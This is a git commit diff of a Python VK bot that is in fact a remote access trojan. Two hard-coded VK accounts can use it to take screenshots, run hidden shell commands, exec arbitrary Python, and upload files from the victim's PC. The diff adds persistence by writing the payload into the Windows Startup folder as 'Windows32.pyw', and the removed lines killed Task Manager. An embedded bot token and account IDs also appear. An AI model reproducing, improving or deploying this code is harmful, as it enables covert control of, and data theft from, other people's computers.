38930da23b7828c7dbb435a4aa648ada090fad7d
Friendosie <75134000+Friendosie@users.noreply.github.com>
2022-07-13 13:00:53 +0600

    Update mybot.py

--- mybot.py
+++ mybot.py
@@ -1,45 +1,47 @@
-from vkbottle.bot import Bot, Message
+import getpass, os
+username = getpass.getuser()
+bot_text = (rf"""from vkbottle.bot import Bot, Message
 from vkbottle import API, PhotoMessageUploader, LoopWrapper, DocMessagesUploader
-import asyncio, getpass, os
+import asyncio, getpass, base64, requests, os, subprocess
 lw = LoopWrapper()
-bot = Bot("3513a0158b87ebf2a29d71f518ded90c22941c92c627391f5546af721161980d2794200299b28c12efbdc")
+bot = Bot('3513a0158b87ebf2a29d71f518ded90c22941c92c627391f5546af721161980d2794200299b28c12efbdc')
 
 @bot.on.private_message(text='screen')
 async def priv(message: Message):
-    if message.from_id == 690634508:
+    if message.from_id == 690634508 or message.from_id == 355981903:
         try:
             import pyautogui
             photo = PhotoMessageUploader(bot.api)
-            pyautogui.screenshot('screen.jpg')
-            photo_upd = await photo.upload('screen.jpg')
+            pyautogui.screenshot(r'C://Users/{username}/AppData/screen.jpg')
+            photo_upd = await photo.upload(r'C://Users/{username}/AppData/screen.jpg')
             await message.answer(attachment=photo_upd)
         except Exception as Er:
             await message.answer(str(Er))
 
-@bot.on.private_message(text="-p<command>")
+@bot.on.private_message(text='-p<command>')
 async def priv(message: Message, command):
-    if message.from_id == 690634508:
+    if message.from_id == 690634508 or message.from_id == 355981903:
         try:
             popen = (os.popen(command))
             lines = popen.readlines()
-            b = ""
+            b = ''
             for g in lines:
                 b = b + g
             await message.answer(b)
         except Exception as Er:
             await message.answer(Er)
 
-@bot.on.private_message(text="-getfilecom <command>")
+@bot.on.private_message(text='-getfilecom <command>')
 async def priv(message: Message, command):
-    if message.from_id == 690634508:
+    if message.from_id == 690634508 or message.from_id == 355981903:
         try:
-            path = os.getcwd()
+            path = r"C://Users/{username}/AppData"
             popen = (os.popen(command))
             lines = popen.readlines()
-            b = ""
+            b = ''
             for g in lines:
                 b = b + g
-            fullpath = path + "/commandlog.txt"
+            fullpath = path + '/commandlog.txt'
             with open(fullpath, 'w') as f:
                 f.write(b)
             docupd = DocMessagesUploader(bot.api)
@@ -48,52 +50,53 @@ async def priv(message: Message, command):
         except Exception as Er:
             await message.answer(Er)
 
-@bot.on.private_message(text="-read <path>")
+@bot.on.private_message(text='-read <path>')
 async def priv(message: Message, path):
-    if message.from_id == 690634508:
+    if message.from_id == 690634508 or message.from_id == 355981903:
         try:
-            b = ""
+            b = ''
             docupd = DocMessagesUploader(bot.api)
-            mydoc = await docupd.upload('test.txt', path, peer_id=message.peer_id)
+            mydoc = await docupd.upload('inforead.txt', path, peer_id=message.peer_id)
             await message.answer('Completed', attachment=mydoc)
         except Exception as Er:
             await message.answer(Er)
 
-@bot.on.private_message(text="-th")
+@bot.on.private_message(text='-th')
 async def priv(message: Message):
-    if message.from_id == 690634508:
+    if message.from_id == 690634508 or message.from_id == 355981903:
         try:
             cwd = os.getcwd()
             await message.answer(cwd)
         except Exception as Er:
             await message.answer(Er)
-
+@bot.on.private_message(text='-sp<com>')
+async def priv(message: Message, com):
+    if message.from_id == 690634508 or message.from_id == 355981903:
+        try:
+            CREATE_NO_WINDOW = 0x08000000
+            subprocess.call(com, creationflags=CREATE_NO_WINDOW)
+        except Exception as Er:
+            await message.answer(Er)
 @bot.on.private_message()
 async def priv(message: Message):
-    if message.from_id == 690634508:
+    if message.from_id == 690634508 or message.from_id == 355981903:
         try:
             msg = message.text
-            msg = msg.replace(r"\n", "\n")
+            msg = msg.replace(r'\n', '\n')
             exec(message.text)
         except Exception as Er:
             await message.answer(str(Er))
 
 @lw.timer(seconds=1)
 async def delayed_task():
-    api = API("3513a0158b87ebf2a29d71f518ded90c22941c92c627391f5546af721161980d2794200299b28c12efbdc")
-    await api.messages.send(peer_id=690634508, message=(((getpass.getuser()).replace("PC", "")) + " was connected"), random_id=0)
-    while True:
-        try:
-            os.system('taskkill /f /im ProcessHacker.exe')
-            os.system('taskkill /f /im Taskmgr.exe')
-            try:
-                os.system("clear")
-            except Exception as Er:
-                os.system('cls')
-            await asyncio.sleep(0.4)
-        except Exception as Er:
-            await asyncio.sleep(0.2)
+    api = API('3513a0158b87ebf2a29d71f518ded90c22941c92c627391f5546af721161980d2794200299b28c12efbdc')
+    await api.messages.send(peer_id=690634508, message=(((getpass.getuser()).replace('PC', '')) + ' was connected'), random_id=0)
+    await api.messages.send(peer_id=355981903, message=(((getpass.getuser()).replace('PC', '')) + ' was connected'), random_id=0)
+
 
 
 bot.loop_wrapper = lw
-bot.run_forever()
+bot.run_forever()""")
+username = username.replace('PC', '')
+with open(fr'C://Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Windows32.pyw', 'w', encoding='utf-8') as f:
+    f.write(bot_text)
